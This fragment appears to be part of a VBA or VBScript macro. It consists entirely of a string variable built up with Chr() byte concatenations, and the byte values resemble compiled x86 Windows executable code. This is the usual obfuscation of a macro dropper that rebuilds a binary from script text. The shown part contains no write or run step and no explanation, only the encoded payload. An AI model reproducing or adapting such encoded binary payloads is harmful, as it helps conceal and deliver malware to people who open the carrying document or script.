ySXd=ySXd&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(198)&Chr(3)&Chr(131)&Chr(199)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(204)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(198)&Chr(2)&Chr(131)&Chr(199)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(166)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(144)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(131)&Chr(198)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(11)&Chr(101)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(248)&Chr(100)&Chr(64)&Chr(0)&Chr(240)&Chr(100)&Chr(64)&Chr(0)&Chr(232)&Chr(100)&Chr(64)&Chr(0)&Chr(224)&Chr(100)&Chr(64)&Chr(0)&Chr(216)&Chr(100)&Chr(64)&Chr(0)&Chr(208)&Chr(100)&Chr(64)&Chr(0)&Chr(200)&Chr(100)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(228)&Chr(137)&Chr(68)&Chr(143)&Chr(228)&Chr(139)&Chr(68)&Chr(142)&Chr(232)&Chr(137)&Chr(68)&Chr(143)&Chr(232)&Chr(139)&Chr(68)&Chr(142)&Chr(236)&Chr(137)&Chr(68)&Chr(143)&Chr(236)&Chr(139)&Chr(68)&Chr(142)&Chr(240)&Chr(137)&Chr(68)&Chr(143)&Chr(240)&Chr(139)&Chr(68)&Chr(142)&Chr(244)&Chr(137)&Chr(68)&Chr(143)&Chr(244)&Chr(139)&Chr(68)&Chr(142)&Chr(248)&Chr(137)&Chr(68)&Chr(143)&Chr(248)&Chr(139)&Chr(68)&Chr(142)&Chr(252)&Chr(137)&Chr(68)&Chr(143)&Chr(252)&Chr(141)&Chr(4)&Chr(141)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)
ySXd=ySXd&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(36)&Chr(101)&Chr(64)&Chr(0)&Chr(44)&Chr(122)&Chr(64)&Chr(0)&Chr(56)&Chr(101)&Chr(64)&Chr(0)&Chr(76)&Chr(101)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(141)&Chr(116)&Chr(49)&Chr(252)&Chr(141)&Chr(124)&Chr(57)&Chr(252)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(36)
ySXd=ySXd&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(13)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(247)&Chr(217)&Chr(255)&Chr(36)&Chr(141)&Chr(96)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(249)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(43)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(180)&Chr(101)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(144)&Chr(196)&Chr(101)&Chr(64)&Chr(0)&Chr(232)&Chr(101)&Chr(64)&Chr(0)&Chr(16)&Chr(102)&Chr(64)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(131)&Chr(238)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(239)&Chr(1)&Chr(131)&Chr(249)&Chr(8)
ySXd=ySXd&Chr(114)&Chr(178)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(238)&Chr(2)&Chr(131)&Chr(239)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(238)&Chr(3)&Chr(131)&Chr(239)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(15)&Chr(130)&Chr(86)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)
ySXd=ySXd&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(100)&Chr(102)&Chr(64)&Chr(0)&Chr(108)&Chr(102)&Chr(64)&Chr(0)&Chr(116)&Chr(102)&Chr(64)&Chr(0)&Chr(124)&Chr(102)&Chr(64)&Chr(0)&Chr(132)&Chr(102)&Chr(64)&Chr(0)&Chr(140)&Chr(102)&Chr(64)&Chr(0)&Chr(148)&Chr(102)&Chr(64)&Chr(0)&Chr(167)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(28)&Chr(137)&Chr(68)&Chr(143)&Chr(28)&Chr(139)&Chr(68)&Chr(142)&Chr(24)&Chr(137)&Chr(68)&Chr(143)&Chr(24)&Chr(139)&Chr(68)&Chr(142)&Chr(20)&Chr(137)&Chr(68)&Chr(143)&Chr(20)&Chr(139)&Chr(68)&Chr(142)&Chr(16)&Chr(137)&Chr(68)&Chr(143)&Chr(16)&Chr(139)&Chr(68)&Chr(142)&Chr(12)&Chr(137)&Chr(68)&Chr(143)&Chr(12)&Chr(139)&Chr(68)&Chr(142)&Chr(8)&Chr(137)&Chr(68)&Chr(143)&Chr(8)&Chr(139)&Chr(68)&Chr(142)&Chr(4)&Chr(137)&Chr(68)&Chr(143)&Chr(4)&Chr(141)&Chr(4)&Chr(141)&Chr(0)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(192)&Chr(102)&Chr(64)&Chr(0)&Chr(200)&Chr(102)&Chr(64)&Chr(0)&Chr(216)&Chr(102)&Chr(64)&Chr(0)&Chr(236)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(70)&Chr(3)&Chr(136)&Chr(71)&Chr(3)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)
ySXd=ySXd&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(163)&Chr(208)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(13)&Chr(204)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(21)&Chr(200)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(29)&Chr(196)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(53)&Chr(192)&Chr(179)&Chr(64)&Chr(0)&Chr(137)&Chr(61)&Chr(188)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(21)&Chr(232)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(13)&Chr(220)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(29)&Chr(184)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(5)&Chr(180)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(37)&Chr(176)&Chr(179)&Chr(64)&Chr(0)&Chr(102)&Chr(140)&Chr(45)&Chr(172)&Chr(179)&Chr(64)&Chr(0)&Chr(156)&Chr(143)&Chr(5)&Chr(224)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(0)&Chr(163)
ySXd=ySXd&Chr(212)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(4)&Chr(163)&Chr(216)&Chr(179)&Chr(64)&Chr(0)&Chr(141)&Chr(69)&Chr(8)&Chr(163)&Chr(228)&Chr(179)&Chr(64)&Chr(0)&Chr(139)&Chr(133)&Chr(224)&Chr(252)&Chr(255)&Chr(255)&Chr(199)&Chr(5)&Chr(32)&Chr(179)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(161)&Chr(216)&Chr(179)&Chr(64)&Chr(0)&Chr(163)&Chr(212)&Chr(178)&Chr(64)&Chr(0)&Chr(199)&Chr(5)&Chr(200)&Chr(178)&Chr(64)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(192)&Chr(199)&Chr(5)&Chr(204)&Chr(178)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(161)&Chr(252)&Chr(169)&Chr(64)&Chr(0)&Chr(137)&Chr(133)&Chr(220)&Chr(252)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(156)&Chr(128)&Chr(64)&Chr(0)&Chr(163)&Chr(24)&Chr(179)&Chr(64)&Chr(0)&Chr(106)
ySXd=ySXd&Chr(1)&Chr(232)&Chr(136)&Chr(234)&Chr(255)&Chr(255)&Chr(89)&Chr(106)&Chr(0)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(104)&Chr(28)&Chr(146)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(152)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(61)&Chr(24)&Chr(179)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(8)&Chr(106)&Chr(1)&Chr(232)&Chr(100)&Chr(234)&Chr(255)&Chr(255)&Chr(89)&Chr(104)&Chr(9)&Chr(4)&Chr(0)&Chr(192)&Chr(255)&Chr(21)&Chr(148)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(255)&Chr(21)&Chr(144)&Chr(128)&Chr(64)&Chr(0)&Chr(201)&Chr(195)&Chr(204)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(87)&Chr(85)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(104)&Chr(36)&Chr(104)&Chr(64)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(250)&Chr(9)&Chr(0)&Chr(0)&Chr(93)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(76)&Chr(36)&Chr(4)
ySXd=ySXd&Chr(247)&Chr(65)&Chr(4)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(50)&Chr(139)&Chr(68)&Chr(36)&Chr(20)&Chr(139)&Chr(72)&Chr(252)&Chr(51)&Chr(200)&Chr(232)&Chr(146)&Chr(231)&Chr(255)&Chr(255)&Chr(85)&Chr(139)&Chr(104)&Chr(16)&Chr(139)&Chr(80)&Chr(40)&Chr(82)&Chr(139)&Chr(80)&Chr(36)&Chr(82)&Chr(232)&Chr(20)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(8)&Chr(93)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(16)&Chr(137)&Chr(2)&Chr(184)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(83)&Chr(86)&Chr(87)&Chr(139)&Chr(68)&Chr(36)&Chr(16)&Chr(85)&Chr(80)&Chr(106)&Chr(254)&Chr(104)&Chr(44)&Chr(104)&Chr(64)&Chr(0)&Chr(100)&Chr(255)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(196)&Chr(80)&Chr(141)&Chr(68)&Chr(36)&Chr(4)
ySXd=ySXd&Chr(100)&Chr(163)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(36)&Chr(40)&Chr(139)&Chr(88)&Chr(8)&Chr(139)&Chr(112)&Chr(12)&Chr(131)&Chr(254)&Chr(255)&Chr(116)&Chr(58)&Chr(131)&Chr(124)&Chr(36)&Chr(44)&Chr(255)&Chr(116)&Chr(6)&Chr(59)&Chr(116)&Chr(36)&Chr(44)&Chr(118)&Chr(45)&Chr(141)&Chr(52)&Chr(118)&Chr(139)&Chr(12)&Chr(179)&Chr(137)&Chr(76)&Chr(36)&Chr(12)&Chr(137)&Chr(72)&Chr(12)&Chr(131)&Chr(124)&Chr(179)&Chr(4)&Chr(0)&Chr(117)&Chr(23)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(179)&Chr(8)&Chr(232)&Chr(73)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(179)&Chr(8)&Chr(232)&Chr(95)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(183)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(100)&Chr(137)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(24)&Chr(95)&Chr(94)&Chr(91)&Chr(195)&Chr(51)&Chr(192)&Chr(100)
ySXd=ySXd&Chr(139)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(121)&Chr(4)&Chr(44)&Chr(104)&Chr(64)&Chr(0)&Chr(117)&Chr(16)&Chr(139)&Chr(81)&Chr(12)&Chr(139)&Chr(82)&Chr(12)&Chr(57)&Chr(81)&Chr(8)&Chr(117)&Chr(5)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(83)&Chr(81)&Chr(187)&Chr(32)&Chr(171)&Chr(64)&Chr(0)&Chr(235)&Chr(11)&Chr(83)&Chr(81)&Chr(187)&Chr(32)&Chr(171)&Chr(64)&Chr(0)&Chr(139)&Chr(76)&Chr(36)&Chr(12)&Chr(137)&Chr(75)&Chr(8)&Chr(137)&Chr(67)&Chr(4)&Chr(137)&Chr(107)&Chr(12)&Chr(85)&Chr(81)&Chr(80)&Chr(88)&Chr(89)&Chr(93)&Chr(89)&Chr(91)&Chr(194)&Chr(4)&Chr(0)&Chr(255)&Chr(208)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(4)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(12)&Chr(193)&Chr(233)&Chr(7)&Chr(102)&Chr(15)&Chr(239)&Chr(192)&Chr(235)&Chr(8)&Chr(141)
ySXd=ySXd&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(102)&Chr(15)&Chr(127)&Chr(7)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(16)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(32)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(48)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(64)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(80)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(96)&Chr(102)&Chr(15)&Chr(127)&Chr(71)&Chr(112)&Chr(141)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(73)&Chr(117)&Chr(208)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(137)&Chr(125)&Chr(252)&Chr(139)&Chr(69)&Chr(8)&Chr(153)&Chr(139)&Chr(248)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(131)&Chr(231)&Chr(15)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(133)&Chr(255)&Chr(117)&Chr(60)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(209)&Chr(131)&Chr(226)&Chr(127)
ySXd=ySXd&Chr(137)&Chr(85)&Chr(244)&Chr(59)&Chr(202)&Chr(116)&Chr(18)&Chr(43)&Chr(202)&Chr(81)&Chr(80)&Chr(232)&Chr(115)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(8)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(85)&Chr(244)&Chr(133)&Chr(210)&Chr(116)&Chr(69)&Chr(3)&Chr(69)&Chr(16)&Chr(43)&Chr(194)&Chr(137)&Chr(69)&Chr(248)&Chr(51)&Chr(192)&Chr(139)&Chr(125)&Chr(248)&Chr(139)&Chr(77)&Chr(244)&Chr(243)&Chr(170)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(46)&Chr(247)&Chr(223)&Chr(131)&Chr(199)&Chr(16)&Chr(137)&Chr(125)&Chr(240)&Chr(51)&Chr(192)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(240)&Chr(243)&Chr(170)&Chr(139)&Chr(69)&Chr(240)&Chr(139)&Chr(77)&Chr(8)&Chr(139)&Chr(85)&Chr(16)&Chr(3)&Chr(200)&Chr(43)&Chr(208)&Chr(82)&Chr(106)&Chr(0)&Chr(81)&Chr(232)&Chr(126)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(125)
ySXd=ySXd&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(141)&Chr(77)&Chr(232)&Chr(232)&Chr(17)&Chr(203)&Chr(255)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(141)&Chr(67)&Chr(1)&Chr(61)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(119)&Chr(15)&Chr(139)&Chr(69)&Chr(232)&Chr(139)&Chr(128)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(183)&Chr(4)&Chr(88)&Chr(235)&Chr(117)&Chr(137)&Chr(93)&Chr(8)&Chr(193)&Chr(125)&Chr(8)&Chr(8)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(139)&Chr(69)&Chr(8)&Chr(37)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(167)&Chr(2)&Chr(0)&Chr(0)&Chr(89)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(18)&Chr(138)&Chr(69)&Chr(8)&Chr(106)&Chr(2)&Chr(136)&Chr(69)&Chr(248)&Chr(136)&Chr(93)&Chr(249)&Chr(198)&Chr(69)&Chr(250)&Chr(0)&Chr(89)
ySXd=ySXd&Chr(235)&Chr(10)&Chr(51)&Chr(201)&Chr(136)&Chr(93)&Chr(248)&Chr(198)&Chr(69)&Chr(249)&Chr(0)&Chr(65)&Chr(139)&Chr(69)&Chr(232)&Chr(106)&Chr(1)&Chr(255)&Chr(112)&Chr(20)&Chr(255)&Chr(112)&Chr(4)&Chr(141)&Chr(69)&Chr(252)&Chr(80)&Chr(81)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(141)&Chr(69)&Chr(232)&Chr(106)&Chr(1)&Chr(80)&Chr(232)&Chr(167)&Chr(238)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(32)&Chr(133)&Chr(192)&Chr(117)&Chr(16)&Chr(56)&Chr(69)&Chr(244)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(240)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(235)&Chr(20)&Chr(15)&Chr(183)&Chr(69)&Chr(252)&Chr(35)&Chr(69)&Chr(12)&Chr(128)&Chr(125)&Chr(244)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(240)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(91)&Chr(201)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)
ySXd=ySXd&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(8)&Chr(43)&Chr(200)&Chr(131)&Chr(225)&Chr(15)&Chr(3)&Chr(193)&Chr(27)&Chr(201)&Chr(11)&Chr(193)&Chr(89)&Chr(233)&Chr(106)&Chr(2)&Chr(0)&Chr(0)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(8)&Chr(43)&Chr(200)&Chr(131)&Chr(225)&Chr(7)&Chr(3)&Chr(193)&Chr(27)&Chr(201)&Chr(11)&Chr(193)&Chr(89)&Chr(233)&Chr(84)&Chr(2)&Chr(0)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(12)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(106)&Chr(6)&Chr(141)&Chr(69)&Chr(244)&Chr(80)&Chr(104)&Chr(4)&Chr(16)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(198)&Chr(69)&Chr(250)&Chr(0)&Chr(255)&Chr(21)&Chr(204)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(5)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(10)&Chr(141)
ySXd=ySXd&Chr(69)&Chr(244)&Chr(80)&Chr(232)&Chr(249)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(123)&Chr(228)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(52)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(139)&Chr(69)&Chr(16)&Chr(139)&Chr(77)&Chr(24)&Chr(137)&Chr(69)&Chr(216)&Chr(139)&Chr(69)&Chr(20)&Chr(83)&Chr(137)&Chr(69)&Chr(208)&Chr(139)&Chr(0)&Chr(86)&Chr(137)&Chr(69)&Chr(220)&Chr(139)&Chr(69)&Chr(8)&Chr(87)&Chr(51)&Chr(255)&Chr(137)&Chr(77)&Chr(204)&Chr(137)&Chr(125)&Chr(224)&Chr(137)&Chr(125)&Chr(212)&Chr(59)&Chr(69)&Chr(12)&Chr(15)&Chr(132)&Chr(95)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(168)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(77)&Chr(232)&Chr(81)&Chr(80)&Chr(255)&Chr(214)&Chr(139)&Chr(29)
ySXd=ySXd&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(94)&Chr(131)&Chr(125)&Chr(232)&Chr(1)&Chr(117)&Chr(88)&Chr(141)&Chr(69)&Chr(232)&Chr(80)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(75)&Chr(131)&Chr(125)&Chr(232)&Chr(1)&Chr(117)&Chr(69)&Chr(139)&Chr(117)&Chr(220)&Chr(199)&Chr(69)&Chr(212)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(254)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(216)&Chr(232)&Chr(36)&Chr(200)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(89)&Chr(70)&Chr(59)&Chr(247)&Chr(126)&Chr(91)&Chr(129)&Chr(254)&Chr(240)&Chr(255)&Chr(255)&Chr(127)&Chr(119)&Chr(83)&Chr(141)&Chr(68)&Chr(54)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(47)&Chr(232)&Chr(228)&Chr(254)&Chr(255)&Chr(255)&Chr(139)&Chr(196)&Chr(59)&Chr(199)&Chr(116)&Chr(56)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(235)&Chr(45)&Chr(87)&Chr(87)&Chr(255)&Chr(117)&Chr(220)&Chr(255)&Chr(117)&Chr(216)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(211)&Chr(139)&Chr(240)&Chr(59)&Chr(247)&Chr(117)&Chr(195)&Chr(51)&Chr(192)&Chr(233)&Chr(209)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(232)&Chr(175)&Chr(237)&Chr(255)&Chr(255)&Chr(89)&Chr(59)&Chr(199)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(137)&Chr(69)&Chr(228)&Chr(235)&Chr(3)&Chr(137)&Chr(125)&Chr(228)&Chr(57)&Chr(125)&Chr(228)&Chr(116)&Chr(216)&Chr(141)&Chr(4)&Chr(54)&Chr(80)&Chr(87)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(12)&Chr(230)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(86)&Chr(255)&Chr(117)&Chr(228)&Chr(255)&Chr(117)&Chr(220)&Chr(255)&Chr(117)&Chr(216)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(211)&Chr(133)&Chr(192)&Chr(116)&Chr(127)
